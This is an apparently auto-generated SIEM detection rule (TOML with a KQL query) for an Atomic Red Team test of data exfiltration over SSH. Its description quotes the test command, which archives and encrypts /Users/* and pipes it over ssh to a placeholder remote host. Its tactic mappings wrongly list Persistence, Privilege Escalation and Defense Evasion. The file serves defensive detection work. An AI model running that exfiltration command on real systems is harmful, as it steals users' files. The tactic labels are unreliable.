[rule]
author = [ "AtomicRedTeam-Automation",]
description = "Detection for specific test 'Exfiltration Over Alternative Protocol - SSH' (GUID: 7c3cb337-35ae-4d06-bf03-3032ed2ec268) of technique T1048 (Exfiltration Over Alternative Protocol). Test Description: Input a domain and test Exfiltration over SSH\n\nLocal to Remote\n\nUpon successful execution, tar will compress /Users/* directory and password protect the file modification of `Users.tar.gz.enc` as output.. Command/Steps: tar czpf - /Users/* | openssl des3 -salt -pass #{password} | ssh #{user_name}@#{domain} 'cat > /Users.tar.gz.enc'\n"
from = "now-9m"
rule_id = "d56af8b6-ff7e-4eec-84a0-4b0c64fb4eaf"
language = "kql"
name = "Atomic Test: T1048 - Exfiltration Over Alternative Protocol - SSH"
output_index = ".siem-signals-default"
references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048/T1048.yaml",]
risk_score = 50
severity = "medium"
tags = [ "AtomicRedTeam", "T1048", "7c3cb337-35ae-4d06-bf03-3032ed2ec268", "macos", "linux",]
type = "query"
query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*czpf*\\\" AND process.command_line : \\\"*/Users/*\\\" AND process.command_line : \\\"*openssl*\\\""
version = 1
index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
[[rule.threat]]
framework = "MITRE ATT&CK"
[[rule.threat.technique]]
id = "T1048"
name = "Exfiltration Over Alternative Protocol - SSH"
reference = "https://attack.mitre.org/techniques/T1048"

[[rule.threat.tactic]]
id = "TA0003"
name = "Persistence"
reference = "https://attack.mitre.org/techniques/T1048"

[[rule.threat.tactic]]
id = "TA0004"
name = "Privilege Escalation"
reference = "https://attack.mitre.org/techniques/T1048"

[[rule.threat.tactic]]
id = "TA0005"
name = "Defense Evasion"
reference = "https://attack.mitre.org/techniques/T1048"


